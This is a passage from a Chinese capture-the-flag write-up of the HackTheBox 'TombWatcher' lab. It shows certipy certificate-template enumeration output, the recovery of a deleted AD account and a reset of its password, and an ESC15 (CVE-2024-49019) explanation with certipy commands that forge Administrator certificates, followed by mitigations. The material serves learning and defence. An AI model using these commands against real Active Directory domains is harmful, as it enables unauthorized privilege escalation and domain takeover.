    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  23
    Template Name                       : CTLSigning
    Display Name                        : Trust List Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Microsoft Trust List Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  24
    Template Name                       : CodeSigning
    Display Name                        : Code Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  25
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  26
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  27
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
  28
    Template Name                       : SmartcardLogon
    Display Name                        : Smartcard Logon
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Extended Key Usage                  : Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  29
    Template Name                       : ClientAuth
    Display Name                        : Authenticated Session
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
  30
    Template Name                       : SmartcardUser
    Display Name                        : Smartcard User
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Extended Key Usage                  : Secure Email
                                          Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
  31
    Template Name                       : UserSignature
    Display Name                        : User Signature Only
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
  32
    Template Name                       : User
    Display Name                        : User
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Domain Users
                                          TOMBWATCHER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\Domain Users
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
```

## 恢复用户

查询被软删除的AD用户

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects



Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

以下命令可以直接查看被删除前用户的OU路径：

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq "user"} -IncludeDeletedObjects -Properties samAccountName, objectSid, whenCreated, whenChanged, lastKnownParent | Select-Object Name, samAccountName, ObjectGUID, @{Name="SID";Expression={$_.objectSid}}, @{Name="删除时间";Expression={$_.whenChanged}}, @{Name="原位置";Expression={$_.lastKnownParent}} | Format-Table -AutoSize -Wrap

Name                                                samAccountName ObjectGUID                           SID                                            删除时间                  原位置
----                                                -------------- ----------                           ---                                            ----                  ---
cert_admin                                          cert_admin     f80369c8-96a2-4a7f-a56c-9c15edd7d1e3 S-1-5-21-1392491010-1358638721-2126982587-1109 8/10/2025 9:22:01 AM  OU=ADCS,DC=tombwatcher,DC=htb
DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
cert_admin                                          cert_admin     c1f1f0fe-df9c-494c-bf05-0679e181b358 S-1-5-21-1392491010-1358638721-2126982587-1110 8/10/2025 8:44:43 AM  OU=ADCS,DC=tombwatcher,DC=htb
DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
cert_admin                                          cert_admin     938182c3-bf0b-410a-9aaa-45c8e1a02ebf S-1-5-21-1392491010-1358638721-2126982587-1111 8/10/2025 10:07:01 AM OU=ADCS,DC=tombwatcher,DC=htb
DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```

---

 **命令作用**
这个命令用于 **检索 Active Directory 中已删除的用户对象**，适用于：

- **审计**：追踪用户删除事件。
- **取证**：调查潜在恶意账户清理行为。
- **恢复**：从 AD 回收站还原误删账户（需启用 AD 回收站功能）。

---

### **命令 1：详细查询已删除用户并格式化输出**

```powershell
Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq "user"} `
  -IncludeDeletedObjects `
  -Properties samAccountName, objectSid, whenCreated, whenChanged, lastKnownParent |
Select-Object Name, samAccountName, ObjectGUID, 
  @{Name="SID";Expression={$_.objectSid}}, 
  @{Name="删除时间";Expression={$_.whenChanged}}, 
  @{Name="原位置";Expression={$_.lastKnownParent}} |
Format-Table -AutoSize -Wrap
```

---

#### **(1) `Get-ADObject` 核心参数**

- **`-Filter`**:  
  
  ```powershell
  {isDeleted -eq $true -and objectClass -eq "user"}
  ```
  
  - **`isDeleted -eq $true`**: 筛选已被删除的对象。  
  - **`objectClass -eq "user"`**: 限定对象类别为用户（避免包含组、计算机等）。

- **`-IncludeDeletedObjects`**:  
  明确指示包含已删除对象（默认不包含）。

- **`-Properties`**:  
  指定要提取的属性：
  
  - **`samAccountName`**: 用户登录名（如 `john`）。  
  - **`objectSid`**: 用户唯一安全标识符（SID）。  
  - **`whenCreated`**: 用户创建时间。  
  - **`whenChanged`**: 用户最后一次修改时间（通常近似删除时间）。  
  - **`lastKnownParent`**: 删除前所在的组织单元（OU）路径。

---

#### **(2) `Select-Object` 属性映射**

- **自定义列名与属性映射**:  
  
  ```powershell
  @{Name="SID"; Expression={$_.objectSid}}         # 重命名 objectSid 为 SID
  @{Name="删除时间"; Expression={$_.whenChanged}} # 将 whenChanged 显示为删除时间
  @{Name="原位置"; Expression={$_.lastKnownParent}} # 显示原 OU 路径
  ```

---

#### **(3) `Format-Table` 格式化输出**

- **`-AutoSize`**: 自动调整列宽。  
- **`-Wrap`**: 允许长文本换行显示（避免截断 OU 路径）。

---

恢复用户，需要`ObjectGUID`：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e987618166d2426dbefd95623690ab38.png)

 john 用户对 ADCS 有GenericAll 权限，那么 john 可以修改cert_admin 的密码：

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/51b00d5fb76c4cc9a05b4a7d53126c23.png)

但是依然不能winrm，用`cert_admin`再`certipyad`一下：

```bash
┌──(root㉿kali)-[~kali/Desktop]
└─# certipy-ad find -u cert_admin -p passwd@123 -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250810113951_Certipy.txt'
[*] Wrote text output to '20250810113951_Certipy.txt'
[*] Saving JSON output to '20250810113951_Certipy.json'
[*] Wrote JSON output to '20250810113951_Certipy.json'
```

```bash
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

## ESC15

[ESC15原文](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)

### **ESC15（CVE-2024-49019 "EKUwu"）详解**

**漏洞描述与攻击利用全解析**

### **1. 漏洞概述**

**ESC15**（社区别称 **"EKUwu"**，由 TrustedSec 的 Justin Bollinger 发现，CVE 编号 **CVE-2024-49019**）是 Active Directory 证书服务（ADCS）中存在的高危漏洞，影响未打补丁的证书颁发机构（CA）。攻击者可利用此漏洞在 **V1 模板（架构版本 1）** 颁发的证书中注入任意应用策略（Application Policies），绕过模板的扩展密钥用法（EKU）限制，获取 **意想不到的证书能力**（如客户端认证、注册代理权限）。

---

### **2. 攻击原理**

#### **(1) 漏洞核心逻辑**

- **V1 模板的默认行为**:  
  V1 模板在证书签发时，默认将模板的 EKU 同时写入证书的 `EKU 扩展` 和 `应用策略扩展`。  
- **漏洞触发条件（未打补丁的 CA）**:  
  - 当攻击者通过 **“注册者提供主题”（Enrollee Supplies Subject）** 的 V1 模板提交证书请求时，可在 CSR 中注入自定义的 `应用策略扩展`（如 `Client Authentication`）。  
  - **未修补的 CA** 不会校验这些策略是否与模板定义的 EKU 一致，直接将其写入最终证书。  

#### **(2) 典型攻击场景**

- **场景 A**: 注入 `客户端认证` 策略  
  - 即使模板仅允许 `服务端认证`，攻击者获取的证书仍可用于 **客户端身份验证**（如 Kerberos PKINIT 或 LDAPS）。  
- **场景 B**: 注入 `注册代理` 策略  
  - 结合 ESC3 攻击链，获取 **证书注册代理** 权限，代表高权限用户请求证书。  

---

### **3. 利用条件**

- **模板配置要求**:  
  - Schema 版本为 **V1**。  
  - 启用 **“注册者提供主题”（Enrollee Supplies Subject）**。  
- **CA 状态要求**:  
  - **未安装 2024 年 11 月微软安全补丁**（未修复 CVE-2024-49019）。  
- **权限要求**:  
  - 攻击者需对目标 V1 模板拥有 **注册权限**（Enrollment Rights）。  

---

### **4. 识别漏洞模板（Certipy 检测）**

使用 `certipy-ad find` 扫描 ADCS 环境，标记潜在易受攻击的 V1 模板：  

```bash
certipy-ad find -u <user> -p <password> -dc-ip <IP> -vulnerable
```

#### **关键输出指标**

```yaml
Certificate Templates
  6
    Template Name       : WebServer
    Schema Version      : 1
    Enrollee Supplies Subject : True
    [!] Vulnerabilities : ESC15
    [*] Remarks         : 仅适用于未修补环境，详见 CVE-2024-49019。
```

---

### **5. 漏洞利用步骤**

#### **场景 A：直接伪造身份（注入 `Client Authentication`）**

1. **请求证书（注入策略）**:  
   
   ```bash
   certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 \
     -target CA.CORP.LOCAL -ca CORP-CA -template WebServer \
     -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
     -application-policies 'Client Authentication'
   ```
   
   - **输出**: 生成含 `Client Authentication` 策略的证书 `administrator.pfx`。  

2. **利用证书认证**:  
   
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100 -ldap-shell
   ```
   
   - **结果**: 通过 Schannel 以 `Administrator` 身份登录域控。  

#### **场景 B：注册代理滥用（注入 `Certificate Request Agent`）**

1. **获取代理证书**:  
   
   ```bash
   certipy req -u 'attacker@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.100 \
     -target CA.CORP.LOCAL -ca CORP-CA -template WebServer \
     -application-policies 'Certificate Request Agent'
   ```
   
   - **输出**: 生成代理证书 `attacker.pfx`。  

2. **代理请求高权限证书**:  
   
   ```bash
   certipy req -pfx attacker.pfx -on-behalf-of 'CORP\Administrator' \
     -template User -ca CORP-CA -dc-ip 10.0.0.100
   ```
   
   - **输出**: 生成 `Administrator` 证书 `administrator.pfx`。  

3. **认证为特权用户**:  
   
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
   ```
   
   - **结果**: 获取 `Administrator` 的 NT 哈希，接管域控。  

---

### **6. 缓解措施**

#### **(1) 立即修复**

- **安装微软补丁**:  
  - 所有 CA 服务器需安装 **2024 年 11 月安全更新**，修复 CVE-2024-49019。  

#### **(2) 加固 ADCS 环境**

- **升级 V1 模板**:  
  - 将关键 V1 模板升级为 **V2+**，精细化控制证书扩展属性。  
- **限制注册权限**:  
  - 对含 `Enrollee Supplies Subject` 的 V1 模板实施 **最小权限原则**。  
- **启用审批机制**:  
  - 对敏感模板启用 **“需要 CA 证书管理员批准”**。  

#### **(3) 应急临时方案（谨慎使用）**

```bash
# 禁用应用策略扩展（高风险操作！仅限无法打补丁时临时使用）
certutil -setreg policy\DisableExtensionList +1.3.6.1.4.1.311.21.10
